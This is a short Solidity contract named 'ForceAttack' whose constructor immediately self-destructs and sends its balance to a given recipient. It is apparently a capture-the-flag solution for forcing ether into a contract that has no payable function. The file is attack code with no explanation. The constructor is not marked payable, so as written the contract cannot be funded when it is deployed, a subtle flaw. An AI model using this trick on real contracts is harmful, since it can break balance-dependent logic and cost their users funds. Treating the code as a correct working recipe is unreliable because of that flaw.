// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract ForceAttack{
   
   constructor (address payable recipient){
        selfdestruct(recipient);
   }
}